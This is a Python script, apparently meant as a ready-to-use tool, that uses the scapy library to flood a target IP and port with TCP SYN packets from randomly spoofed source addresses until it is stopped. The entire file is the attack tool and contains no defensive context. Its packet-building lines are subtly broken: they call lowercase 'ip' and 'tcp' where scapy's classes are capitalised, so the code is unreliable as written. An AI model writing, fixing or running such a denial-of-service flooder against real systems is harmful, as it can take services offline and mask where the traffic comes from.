#!/usr/bin/python3
from scapy.all import *
import argparse
import random
import sys

def randomIP():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def randInt():
    return random.randint(1000, 9000)

def SYN_Flood(dstIP, dstPort=80):
    total = 0
    print(f"[+] Sending packets to {dstIP}:{dstPort} (Ctrl+C to stop)")

    try:
        while True:
            ip = ip(src=randomIP(), dst=dstIP)
            tcp = tcp(
                sport=randInt(),
                dport=dstPort,
                flags="S",
                seq=randInt(),
                window=randInt()
            )

            send(ip / tcp, verbose=0)
            total += 1

            if total % 100 == 0:
                print(f"Sent: {total}")

    except KeyboardInterrupt:
        print("\n[!] Stopped")
        print(f"[+] Total sent: {total}")


# ------------- argparse -----------------
ap = argparse.ArgumentParser()

ap.add_argument("-target", type=str, nargs='+',
                help="IP optionally followed by PORT")

args = ap.parse_args()

if not args.target:
    print("[!] Example: sudo python3 main.py -target 192.168.0.10 [80]")
    sys.exit(1)

dstIP = args.target[0]

# ポート指定なし → デフォルト80
dstPort = int(args.target[1]) if len(args.target) > 1 else 80

SYN_Flood(dstIP, dstPort)
